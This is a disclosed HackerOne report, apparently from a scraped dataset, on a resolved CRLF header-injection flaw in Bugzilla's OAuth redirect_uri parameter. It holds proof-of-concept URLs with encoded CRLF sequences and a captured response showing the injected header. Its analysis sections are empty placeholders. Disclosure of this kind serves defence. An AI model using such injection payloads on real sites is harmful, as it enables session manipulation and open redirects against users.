---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2147132'
original_report_id: '2147132'
title: Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection
  via "redirect_uri" parameter
weakness: CRLF Injection
team_handle: mozilla
created_at: '2023-09-13T21:53:54.996Z'
disclosed_at: '2023-10-28T14:57:49.805Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 54
asset_identifier: bugzilla.mozilla.org
asset_type: URL
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter

## Metadata

- HackerOne Report ID: 2147132
- Weakness: CRLF Injection
- Program: mozilla
- Disclosed At: 2023-10-28T14:57:49.805Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
CRLF / HTTP Header Injection.
Allows you to set any headers/etc (Set-Cookie...)
Page: https://bugzilla.mozilla.org/oauth/authorize
Parameter: redirect_uri

## Steps To Reproduce:
PoC - does not require authorization:

1. https://bugzilla.mozilla.org/oauth/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code
2. or (with true redirect): https://bugzilla.mozilla.org/oauth/authorize?client_id=&redirect_uri=\\name.tld%0d%0axxx:something&response_type=code
HTTP response:
```
HTTP/2 302
server: nginx
date: Tue, 21 Feb 2023 12:04:22 GMT
content-length: 0
content-security-policy: default-src 'self'; worker-src 'none'; connect-src 'self' https://product-details.mozilla.org https://www.google-analytics.com https://treeherder.mozilla.org/api/failurecount/ https://crash-stats.mozilla.org/api/SuperSearch/; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://secure.gravatar.com; object-src 'none'; script-src 'self' 'nonce-kYhs2ysp5D5M1gt2i2uKTFaJyxLN8Qm7O112v7Vt6J4dWGrf' 'unsafe-inline' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; frame-src https://crash-stop-addon.herokuapp.com; frame-ancestors 'self'; form-action 'self' https://www.google.com/search https://github.com/login/oauth/authorize https://github.com/login https://phabricator.services.mozilla.com/ https://people.mozilla.org
location:
xxx: something?error=invalid_scope
referrer-policy: same-origin
strict-transport-security: max-age=31536000; includeSubDomains
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
```

## Impact

## Summary:
Possible manipulation of user session / open redirect.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
